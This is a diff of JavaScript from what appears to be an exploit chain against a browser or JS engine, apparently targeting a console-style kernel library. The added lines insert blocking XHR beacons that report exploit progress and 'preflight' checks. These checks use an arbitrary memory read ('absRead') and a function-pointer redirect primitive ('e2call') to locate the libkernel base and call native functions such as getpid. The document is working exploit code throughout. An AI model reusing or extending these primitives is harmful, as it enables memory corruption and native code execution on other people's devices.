@@ -5111,6 +5111,10 @@ function _startWsShell(){
         if(!S.BASE){reply.err='No BASE';break;}
         if(typeof E2_RVAS==='undefined'){reply.err='rvas.js not loaded';break;}
         var elog=[];
+        /* SYNC beacons: the result lines ride BLOCKING XHR POSTs - a crash
+         * 1ms after a stage can no longer lose the evidence (session 14:
+         * the try call's result was lost to a death inside the settle window). */
+        function ELs(s){elog.push(s);try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('E2SHOT-'+s),false);x.send();}catch(e){}}
         try{bs('E2SHOT-START');}catch(e){}
         function EL(s){elog.push(s);try{bs('E2SHOT-'+s);}catch(e){}}
         /* ---- stage 1: harvest the data band [BASE+0x7000000, BASE+0x7400000) ---- */
@@ -5177,19 +5181,29 @@ function _startWsShell(){
         }
         var lkBase=null,cpuRet=null;
         var maxC=parseInt(msg.maxcand)||4;
+        /* PREFLIGHTS (session 14 lesson: the try-call's result was lost to a
+         * death in the post-pipeline settle window; these three lines make
+         * the next trail fully interpretable):
+         *   preflight0: plain Math.round(-5.7) -> '-6' proves JS alive
+         *   preflight1: e2call(round's REAL fn) -> '-6' proves the redirect+
+         *               call+restore machinery alive on an own-module target
+         * Only then the foreign candidates. */
+        ELs('preflight0 -> '+String(Math.round(-5.7)));
+        var origRoundFn=S.absRead(S.neEntry.addr+0x28n,8)[0];
+        ELs('preflight1 -> '+e2call(origRoundFn));
         for(var ti=0;ti<clist.length&&ti<maxC;ti++){
           var B3=clist[ti].B;
-          EL('try 0x'+B3.toString(16)+' (pairs='+clist[ti].pairs+' wden='+clist[ti].wden+')');
+          ELs('try 0x'+B3.toString(16)+' (pairs='+clist[ti].pairs+' wden='+clist[ti].wden+')');
           var r3=e2call(B3+BigInt(E2_LK.getCurrentCpu));
-          EL('cpu call -> '+r3);
+          ELs('cpu call -> '+r3);
           var n3=Number(r3);
           if(isFinite(n3)&&n3>=0&&n3<=7&&Math.floor(n3)===n3){lkBase=B3;cpuRet=n3;break;}
         }
         if(lkBase===null){reply.log=elog;reply.err='no candidate verified';break;}
         /* ---- stage 4: E2 - the getpid wrapper ---- */
-        EL('lk_base=0x'+lkBase.toString(16)+' CONFIRMED cpu='+cpuRet);
+        ELs('lk_base=0x'+lkBase.toString(16)+' CONFIRMED cpu='+cpuRet);
         var pid=e2call(lkBase+BigInt(E2_LK.getpidWrapper));
-        EL('getpid -> '+pid);
+        ELs('getpid -> '+pid);
         reply.lkbase='0x'+lkBase.toString(16);
         reply.cpu=cpuRet;
         reply.pid=pid;
